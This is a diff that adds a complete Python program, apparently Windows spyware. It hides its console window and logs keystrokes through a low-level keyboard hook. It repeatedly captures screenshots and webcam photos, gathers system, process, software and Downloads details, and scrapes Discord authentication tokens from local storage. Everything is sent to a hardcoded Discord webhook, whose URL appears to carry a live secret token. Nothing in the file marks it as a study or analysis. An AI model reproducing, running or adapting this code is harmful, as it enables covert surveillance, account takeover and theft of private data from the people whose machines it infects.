@@ -1,0 +1,426 @@
+import os
+import sys
+import time
+import base64
+import requests
+import subprocess
+import threading
+import cv2
+import numpy as np
+from PIL import ImageGrab
+import io
+import socket
+import getpass
+import platform
+import json
+import tempfile
+import shutil
+import ctypes
+from datetime import datetime, timezone
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1520235001881428098/P7NpzBNubCGGy4iPHnwsZUV4XBx_HWrw3NuLy99zm4CPFGbNbPDUYZwaD5WdvO8l3UgQ"
+running = True
+
+class WindowsKeylogger:
+    def __init__(self):
+        self.buffer = []
+        self.lock = threading.Lock()
+        self.running = True
+        self.hook_id = None
+        self.user32 = ctypes.windll.user32
+        self.kernel32 = ctypes.windll.kernel32
+        self.WM_KEYDOWN = 0x0100
+        self.WM_SYSKEYDOWN = 0x0104
+        self.WH_KEYBOARD_LL = 13
+        self.key_map = {
+            0x08: '[BACKSPACE]', 0x09: '[TAB]', 0x0D: '\n', 0x10: '[SHIFT]',
+            0x11: '[CTRL]', 0x12: '[ALT]', 0x14: '[CAPSLOCK]', 0x1B: '[ESC]',
+            0x20: ' ', 0x21: '[PGUP]', 0x22: '[PGDN]', 0x23: '[END]',
+            0x24: '[HOME]', 0x25: '[LEFT]', 0x26: '[UP]', 0x27: '[RIGHT]',
+            0x28: '[DOWN]', 0x2D: '[INSERT]', 0x2E: '[DELETE]', 0x5B: '[WIN]',
+            0x5C: '[WIN]', 0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]',
+            0x73: '[F4]', 0x74: '[F5]', 0x75: '[F6]', 0x76: '[F7]',
+            0x77: '[F8]', 0x78: '[F9]', 0x79: '[F10]', 0x7A: '[F11]',
+            0x7B: '[F12]', 0x90: '[NUMLOCK]', 0x91: '[SCROLLLOCK]',
+            0xA0: '[LSHIFT]', 0xA1: '[RSHIFT]', 0xA2: '[LCTRL]', 0xA3: '[RCTRL]',
+            0xA4: '[LALT]', 0xA5: '[RALT]'
+        }
+        self.shift_map = {
+            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+            '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
+            ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
+            '`': '~'
+        }
+        self.caps_lock = False
+        self.shift_pressed = False
+        self.HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
+        self.hook_proc = self.HOOKPROC(self.hook_callback)
+
+    def get_ascii_char(self, vk_code, scan_code, flags):
+        state = (ctypes.c_ubyte * 256)()
+        self.user32.GetKeyboardState(ctypes.byref(state))
+        wchar = (ctypes.c_wchar * 2)()
+        result = self.user32.ToUnicode(vk_code, scan_code, state, wchar, 1, flags)
+        if result > 0:
+            char = wchar[0]
+            if self.shift_pressed and char in self.shift_map:
+                return self.shift_map[char]
+            return char
+        return None
+
+    def hook_callback(self, nCode, wParam, lParam):
+        try:
+            if nCode >= 0:
+                if wParam == self.WM_KEYDOWN or wParam == self.WM_SYSKEYDOWN:
+                    vk_code = (ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents.value >> 0) & 0xFF
+                    scan_code = (ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents.value >> 16) & 0xFF
+                    flags = (ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents.value >> 24) & 0xFF
+                    
+                    if vk_code == 0x10:
+                        self.shift_pressed = True
+                    elif vk_code == 0x14:
+                        self.caps_lock = not self.caps_lock
+                    
+                    char = self.get_ascii_char(vk_code, scan_code, flags)
+                    if char is not None and char != '':
+                        with self.lock:
+                            self.buffer.append(char)
+                            if len(self.buffer) > 5000:
+                                self.buffer = self.buffer[-4000:]
+                    elif vk_code in self.key_map:
+                        with self.lock:
+                            self.buffer.append(self.key_map[vk_code])
+                            if len(self.buffer) > 5000:
+                                self.buffer = self.buffer[-4000:]
+        except:
+            pass
+        return self.user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)
+
+    def start(self):
+        try:
+            self.hook_id = self.user32.SetWindowsHookExW(
+                self.WH_KEYBOARD_LL,
+                self.hook_proc,
+                self.kernel32.GetModuleHandleW(None),
+                0
+            )
+            if self.hook_id:
+                msg = ctypes.wintypes.MSG()
+                while self.running:
+                    ret = self.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
+                    if ret == -1:
+                        break
+                    self.user32.TranslateMessage(ctypes.byref(msg))
+                    self.user32.DispatchMessageW(ctypes.byref(msg))
+        except:
+            pass
+
+    def get_buffer(self):
+        with self.lock:
+            if self.buffer:
+                data = ''.join(self.buffer)
+                self.buffer.clear()
+                return data
+            return None
+
+def hide_console():
+    try:
+        if platform.system() == "Windows":
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+
+def take_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        img_bytes = io.BytesIO()
+        screenshot.save(img_bytes, format='PNG')
+        return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
+    except:
+        return None
+
+def take_camera_photo():
+    try:
+        cap = cv2.VideoCapture(0)
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        ret, frame = cap.read()
+        if ret:
+            _, img_encoded = cv2.imencode('.jpg', frame)
+            cap.release()
+            return base64.b64encode(img_encoded.tobytes()).decode('utf-8')
+        cap.release()
+    except:
+        pass
+    return None
+
+def send_to_webhook(data, file_name):
+    try:
+        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False)
+        json.dump(data, temp_file, indent=2, default=str)
+        temp_file.close()
+        computer_name = socket.gethostname()
+        with open(temp_file.name, 'rb') as f:
+            files = {'file': (f"{computer_name}_{file_name}.json", f, 'application/json')}
+            requests.post(WEBHOOK_URL, files=files, timeout=10)
+        os.remove(temp_file.name)
+    except:
+        pass
+
+def send_text_to_webhook(text, title):
+    try:
+        computer_name = socket.gethostname()
+        payload = {
+            "content": f"**{title} - {computer_name}**\n```\n{text[:1900]}\n```"
+        }
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+    except:
+        pass
+
+def send_image_to_webhook(image_b64, name):
+    try:
+        img_data = base64.b64decode(image_b64)
+        computer_name = socket.gethostname()
+        files = {'file': (f"{computer_name}_{name}.png", img_data, 'image/png')}
+        requests.post(WEBHOOK_URL, files=files, timeout=10)
+    except:
+        pass
+
+def get_full_system_report():
+    data = {}
+    
+    data["system"] = {
+        "computer_name": socket.gethostname(),
+        "username": getpass.getuser(),
+        "os": platform.system() + " " + platform.release(),
+        "os_version": platform.version(),
+        "architecture": platform.machine(),
+        "processor": platform.processor(),
+        "cpu_count": os.cpu_count(),
+        "timestamp": datetime.now(timezone.utc).isoformat()
+    }
+    
+    data["network"] = {
+        "ip": socket.gethostbyname(socket.gethostname()),
+        "external_ip": requests.get("https://api.ipify.org", timeout=3).text if requests else "N/A"
+    }
+    
+    drives = []
+    if platform.system() == "Windows":
+        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
+            drive = f"{letter}:\\"
+            if os.path.exists(drive):
+                try:
+                    usage = shutil.disk_usage(drive)
+                    drives.append({
+                        "drive": drive,
+                        "total_gb": round(usage.total / (1024**3), 2),
+                        "used_gb": round(usage.used / (1024**3), 2),
+                        "free_gb": round(usage.free / (1024**3), 2),
+                        "percent_used": round((usage.used / usage.total) * 100, 1)
+                    })
+                except:
+                    pass
+    data["drives"] = drives
+    
+    downloads_path = os.path.expanduser("~/Downloads")
+    downloads = []
+    if os.path.exists(downloads_path):
+        try:
+            for item in os.listdir(downloads_path)[:50]:
+                item_path = os.path.join(downloads_path, item)
+                if os.path.isfile(item_path):
+                    downloads.append({
+                        "name": item,
+                        "size": os.path.getsize(item_path),
+                        "modified": datetime.fromtimestamp(os.path.getmtime(item_path)).isoformat()
+                    })
+        except:
+            pass
+    data["downloads"] = downloads
+    
+    discord_tokens = []
+    discord_paths = []
+    if platform.system() == "Windows":
+        appdata = os.environ.get("APPDATA", "")
+        localappdata = os.environ.get("LOCALAPPDATA", "")
+        discord_paths.extend([
+            os.path.join(appdata, "discord", "Local Storage", "leveldb"),
+            os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
+            os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
+        ])
+    for path in discord_paths:
+        if os.path.exists(path):
+            try:
+                for file in os.listdir(path):
+                    if file.endswith('.log') or file.endswith('.ldb'):
+                        file_path = os.path.join(path, file)
+                        try:
+                            with open(file_path, 'r', errors='ignore') as f:
+                                content = f.read(5000)
+                                import re
+                                token_patterns = [
+                                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
+                                    r'mfa\.[\w-]{84}',
+                                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'
+                                ]
+                                for pattern in token_patterns:
+                                    matches = re.findall(pattern, content)
+                                    for match in matches:
+                                        if match not in discord_tokens:
+                                            discord_tokens.append(match)
+                        except:
+                            pass
+            except:
+                pass
+    data["discord_tokens"] = discord_tokens[:10]
+    
+    processes = []
+    try:
+        if platform.system() == "Windows":
+            output = subprocess.check_output(["tasklist", "/FO", "CSV", "/V"], stderr=subprocess.DEVNULL).decode()
+            for line in output.splitlines()[1:30]:
+                parts = line.split(',')
+                if len(parts) >= 8:
+                    processes.append({
+                        "name": parts[0].strip('"'),
+                        "pid": parts[1].strip('"'),
+                        "memory_mb": parts[4].strip('"'),
+                        "user": parts[6].strip('"')
+                    })
+    except:
+        pass
+    data["processes"] = processes
+    
+    software = []
+    try:
+        if platform.system() == "Windows":
+            import winreg
+            keys = [
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+            ]
+            for hkey, key in keys:
+                try:
+                    with winreg.OpenKey(hkey, key) as reg_key:
+                        index = 0
+                        while True:
+                            try:
+                                subkey_name = winreg.EnumKey(reg_key, index)
+                                with winreg.OpenKey(reg_key, subkey_name) as subkey:
+                                    try:
+                                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                                        version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" in [winreg.EnumValue(subkey, i)[0] for i in range(winreg.QueryInfoKey(subkey)[1])] else "N/A"
+                                        if name:
+                                            software.append({"name": name, "version": version})
+                                    except:
+                                        pass
+                                index += 1
+                            except WindowsError:
+                                break
+                except:
+                    pass
+    except:
+        pass
+    data["installed_software"] = software[:50]
+    
+    return data
+
+def send_initial_report():
+    data = get_full_system_report()
+    data["screenshot"] = take_screenshot()
+    data["camera_photo"] = take_camera_photo()
+    
+    send_to_webhook(data, "system_report")
+    
+    if data.get("screenshot"):
+        send_image_to_webhook(data["screenshot"], "screenshot")
+    if data.get("camera_photo"):
+        send_image_to_webhook(data["camera_photo"], "camera")
+    
+    summary = f"""=== COMPLETE SYSTEM REPORT ===
+Computer: {data['system']['computer_name']}
+User: {data['system']['username']}
+OS: {data['system']['os']}
+Architecture: {data['system']['architecture']}
+CPU: {data['system']['processor']}
+CPU Cores: {data['system']['cpu_count']}
+IP: {data['network']['ip']}
+External IP: {data['network']['external_ip']}
+Drives: {len(data.get('drives', []))}
+Downloads: {len(data.get('downloads', []))}
+Processes: {len(data.get('processes', []))}
+Installed Software: {len(data.get('installed_software', []))}
+Discord Tokens: {len(data.get('discord_tokens', []))}
+Screenshot: {"Taken" if data.get('screenshot') else "Failed"}
+Camera: {"Taken" if data.get('camera_photo') else "Failed"}"""
+    
+    requests.post(WEBHOOK_URL, json={"content": f"```\n{summary}\n```"}, timeout=5)
+
+def keylog_loop():
+    keylogger = WindowsKeylogger()
+    threading.Thread(target=keylogger.start, daemon=True).start()
+    while running:
+        time.sleep(600)
+        keys = keylogger.get_buffer()
+        if keys:
+            computer_name = socket.gethostname()
+            send_text_to_webhook(keys[-3000:], "Keylog Report")
+            data = {
+                "computer": computer_name,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "keys": keys[-5000:]
+            }
+            send_to_webhook(data, f"keylog_{int(time.time())}")
+
+def capture_loop():
+    while running:
+        try:
+            screenshot = take_screenshot()
+            if screenshot:
+                send_image_to_webhook(screenshot, f"screenshot_{int(time.time())}")
+            camera = take_camera_photo()
+            if camera:
+                send_image_to_webhook(camera, f"camera_{int(time.time())}")
+        except:
+            pass
+        time.sleep(30)
+
+def system_monitor():
+    while running:
+        try:
+            info = {
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "computer_name": socket.gethostname(),
+                "username": getpass.getuser(),
+                "processes": []
+            }
+            try:
+                if platform.system() == "Windows":
+                    output = subprocess.check_output(["tasklist", "/FO", "CSV", "/V"], stderr=subprocess.DEVNULL).decode()
+                    info["processes"] = output[:2000]
+            except:
+                pass
+            send_to_webhook(info, f"status_{int(time.time())}")
+        except:
+            pass
+        time.sleep(120)
+
+def main():
+    hide_console()
+    
+    try:
+        send_initial_report()
+    except:
+        pass
+    
+    threading.Thread(target=keylog_loop, daemon=True).start()
+    threading.Thread(target=capture_loop, daemon=True).start()
+    threading.Thread(target=system_monitor, daemon=True).start()
+    
+    while running:
+        time.sleep(1)
+
+if __name__ == "__main__":
+    main()
